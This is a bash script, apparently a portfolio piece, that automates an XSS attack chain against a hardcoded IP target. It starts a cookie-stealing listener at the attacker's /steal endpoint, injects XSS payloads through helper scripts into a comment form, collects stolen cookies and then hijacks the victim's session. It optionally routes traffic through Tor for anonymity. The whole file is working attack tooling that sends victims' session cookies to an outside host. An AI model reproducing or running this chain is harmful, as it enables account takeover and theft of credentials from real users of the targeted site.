#!/bin/bash
# Full XSS Attack Chain - 완전 자동화 공격 체인
# 포트폴리오 목적: 쿠키 탈취부터 세션 하이재킹까지 전체 프로세스

set -e

# 색상 정의
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
BLUE='\033[0;34m'
PURPLE='\033[0;35m'
CYAN='\033[0;36m'
NC='\033[0m' # No Color
BOLD='\033[1m'

# 배너 출력
print_banner() {
    echo -e "${BOLD}${PURPLE}"
    cat << "EOF"
╔═══════════════════════════════════════════════════════════════════╗
║                                                                   ║
║        🎯 XSS Cookie Stealer - Full Attack Chain 🎯              ║
║                                                                   ║
║     [ Cookie Theft → Session Hijacking → Account Takeover ]      ║
║                                                                   ║
╚═══════════════════════════════════════════════════════════════════╝
EOF
    echo -e "${NC}"
}

# 의존성 확인
check_dependencies() {
    echo -e "${BOLD}${CYAN}[*] Checking dependencies...${NC}\n"

    # Python3 확인
    if ! command -v python3 &> /dev/null; then
        echo -e "${RED}❌ Python3 not found. Please install Python3.${NC}"
        exit 1
    fi

    # pip 패키지 확인
    python3 -c "import requests; import flask" 2>/dev/null
    if [ $? -ne 0 ]; then
        echo -e "${YELLOW}⚠ Installing required packages...${NC}"
        pip3 install requests flask PySocks
    fi

    # Tor 확인 (선택사항)
    if command -v tor &> /dev/null; then
        echo -e "${GREEN}✓ Tor found${NC}"
        USE_TOR="--use-tor"
    else
        echo -e "${YELLOW}⚠ Tor not found. Using direct connection.${NC}"
        echo -e "${YELLOW}  Install Tor for anonymity: brew install tor (macOS) or apt install tor (Linux)${NC}"
        USE_TOR="--no-tor"
    fi

    echo -e "${GREEN}✓ All dependencies OK${NC}\n"
}

# 설정 입력
get_config() {
    echo -e "${BOLD}${BLUE}[*] Configuration${NC}\n"

    # 타겟 서버
    read -p "$(echo -e ${CYAN}Target URL [http://3.34.90.201/add_comment.php]: ${NC})" TARGET_URL
    TARGET_URL=${TARGET_URL:-"http://3.34.90.201/add_comment.php"}

    # 리스너 IP (자동 감지 시도)
    LOCAL_IP=$(ifconfig | grep "inet " | grep -v 127.0.0.1 | awk '{print $2}' | head -n 1)
    read -p "$(echo -e ${CYAN}Your IP for cookie listener [$LOCAL_IP]: ${NC})" LISTENER_IP
    LISTENER_IP=${LISTENER_IP:-$LOCAL_IP}

    LISTENER_URL="http://${LISTENER_IP}:8888/steal"

    # HTTP 메서드
    read -p "$(echo -e ${CYAN}HTTP Method [POST]: ${NC})" METHOD
    METHOD=${METHOD:-"POST"}

    # 파라미터
    read -p "$(echo -e ${CYAN}Parameter name [content]: ${NC})" PARAM
    PARAM=${PARAM:-"content"}

    # 지연 시간
    read -p "$(echo -e ${CYAN}Delay between payloads [2]: ${NC})" DELAY
    DELAY=${DELAY:-2}

    echo -e "\n${BOLD}${GREEN}Configuration:${NC}"
    echo -e "  Target URL: ${TARGET_URL}"
    echo -e "  Listener URL: ${LISTENER_URL}"
    echo -e "  Method: ${METHOD}"
    echo -e "  Parameter: ${PARAM}"
    echo -e "  Delay: ${DELAY}s"
    echo -e "  Tor: ${USE_TOR}\n"

    read -p "$(echo -e ${YELLOW}Proceed? [y/N]: ${NC})" CONFIRM
    if [[ ! "$CONFIRM" =~ ^[Yy]$ ]]; then
        echo -e "${RED}Aborted.${NC}"
        exit 0
    fi
}

# Step 1: 쿠키 리스너 시작
start_listener() {
    echo -e "\n${BOLD}${BLUE}╔════════════════════════════════════════╗${NC}"
    echo -e "${BOLD}${BLUE}║  Step 1: Starting Cookie Listener     ║${NC}"
    echo -e "${BOLD}${BLUE}╚════════════════════════════════════════╝${NC}\n"

    # 리스너 백그라운드 실행
    python3 cookie_listener.py > listener.log 2>&1 &
    LISTENER_PID=$!

    echo -e "${GREEN}✓ Cookie listener started (PID: $LISTENER_PID)${NC}"
    echo -e "${GREEN}✓ Listening on: $LISTENER_URL${NC}\n"

    # 리스너 준비 대기
    sleep 3

    # 헬스체크
    curl -s "http://${LISTENER_IP}:8888/health" > /dev/null
    if [ $? -eq 0 ]; then
        echo -e "${GREEN}✓ Listener is ready${NC}\n"
    else
        echo -e "${RED}❌ Listener failed to start${NC}"
        exit 1
    fi
}

# Step 2: XSS 공격 실행
run_exploit() {
    echo -e "${BOLD}${BLUE}╔════════════════════════════════════════╗${NC}"
    echo -e "${BOLD}${BLUE}║  Step 2: Injecting XSS Payloads       ║${NC}"
    echo -e "${BOLD}${BLUE}╚════════════════════════════════════════╝${NC}\n"

    python3 auto_exploit.py \
        -t "$TARGET_URL" \
        -l "$LISTENER_URL" \
        -m "$METHOD" \
        -p "$PARAM" \
        -d "$DELAY" \
        $USE_TOR

    echo -e "\n${GREEN}✓ Exploit completed${NC}\n"
}

# Step 3: 쿠키 수신 대기
wait_for_cookies() {
    echo -e "${BOLD}${BLUE}╔════════════════════════════════════════╗${NC}"
    echo -e "${BOLD}${BLUE}║  Step 3: Waiting for Cookies...       ║${NC}"
    echo -e "${BOLD}${BLUE}╚════════════════════════════════════════╝${NC}\n"

    echo -e "${YELLOW}⏳ Waiting for victim to trigger XSS payload...${NC}"
    echo -e "${YELLOW}   Press Ctrl+C to stop waiting${NC}\n"

    TIMEOUT=300  # 5분
    ELAPSED=0

    while [ $ELAPSED -lt $TIMEOUT ]; do
        if [ -d "stolen_cookies" ] && [ "$(ls -A stolen_cookies)" ]; then
            COOKIE_COUNT=$(ls stolen_cookies/*.json 2>/dev/null | wc -l)
            if [ $COOKIE_COUNT -gt 0 ]; then
                echo -e "\n${GREEN}{'='*70}${NC}"
                echo -e "${GREEN}✓ Got $COOKIE_COUNT cookie(s)!${NC}"
                echo -e "${GREEN}{'='*70}${NC}\n"
                return 0
            fi
        fi

        sleep 5
        ELAPSED=$((ELAPSED + 5))
        echo -ne "${CYAN}⏳ Waiting... ${ELAPSED}s / ${TIMEOUT}s\r${NC}"
    done

    echo -e "\n${YELLOW}⚠ Timeout reached. No cookies received.${NC}\n"
    return 1
}

# Step 4: 세션 하이재킹
hijack_session() {
    echo -e "${BOLD}${BLUE}╔════════════════════════════════════════╗${NC}"
    echo -e "${BOLD}${BLUE}║  Step 4: Session Hijacking             ║${NC}"
    echo -e "${BOLD}${BLUE}╚════════════════════════════════════════╝${NC}\n"

    # 타겟 페이지 (쿠키로 접근할 페이지)
    read -p "$(echo -e ${CYAN}Page to access [http://3.34.90.201/index.php]: ${NC})" HIJACK_URL
    HIJACK_URL=${HIJACK_URL:-"http://3.34.90.201/index.php"}

    TOR_FLAG=""
    if [[ "$USE_TOR" == "--use-tor" ]]; then
        TOR_FLAG="--tor"
    fi

    python3 session_hijacker.py -t "$HIJACK_URL" $TOR_FLAG

    if [ $? -eq 0 ]; then
        echo -e "${GREEN}✓ Session hijacked successfully!${NC}"
        echo -e "${GREEN}✓ Check hijacked_page.html for the result${NC}\n"
    else
        echo -e "${YELLOW}⚠ Session hijack may have failed${NC}\n"
    fi
}

# 정리
cleanup() {
    echo -e "\n${BOLD}${BLUE}[*] Cleaning up...${NC}\n"

    # 리스너 종료
    if [ ! -z "$LISTENER_PID" ]; then
        kill $LISTENER_PID 2>/dev/null
        echo -e "${GREEN}✓ Listener stopped${NC}"
    fi

    echo -e "${GREEN}✓ Attack chain completed${NC}\n"

    # 결과 요약
    echo -e "${BOLD}${PURPLE}╔════════════════════════════════════════╗${NC}"
    echo -e "${BOLD}${PURPLE}║           Attack Summary               ║${NC}"
    echo -e "${BOLD}${PURPLE}╚════════════════════════════════════════╝${NC}\n"

    if [ -f "exploit_results.json" ]; then
        echo -e "📊 Exploit results: exploit_results.json"
    fi

    if [ -d "stolen_cookies" ] && [ "$(ls -A stolen_cookies)" ]; then
        COOKIE_COUNT=$(ls stolen_cookies/*.json 2>/dev/null | wc -l)
        echo -e "🍪 Stolen cookies: $COOKIE_COUNT files in stolen_cookies/"
    fi

    if [ -f "hijacked_session.json" ]; then
        echo -e "🔓 Hijacked session: hijacked_session.json"
    fi

    if [ -f "hijacked_page.html" ]; then
        echo -e "📄 Hijacked page: hijacked_page.html"
    fi

    echo ""
}

# Ctrl+C 핸들러
trap cleanup EXIT

# 메인 실행 흐름
main() {
    print_banner
    check_dependencies
    get_config

    start_listener
    run_exploit

    # 자동 대기 모드
    read -p "$(echo -e ${YELLOW}Wait for cookies automatically? [Y/n]: ${NC})" AUTO_WAIT
    AUTO_WAIT=${AUTO_WAIT:-"Y"}

    if [[ "$AUTO_WAIT" =~ ^[Yy]$ ]]; then
        if wait_for_cookies; then
            # 세션 하이재킹
            read -p "$(echo -e ${YELLOW}Proceed with session hijacking? [Y/n]: ${NC})" DO_HIJACK
            DO_HIJACK=${DO_HIJACK:-"Y"}

            if [[ "$DO_HIJACK" =~ ^[Yy]$ ]]; then
                hijack_session
            fi
        fi
    else
        echo -e "${YELLOW}Manual mode: Run session_hijacker.py when ready${NC}\n"
    fi
}

# 스크립트 실행
main
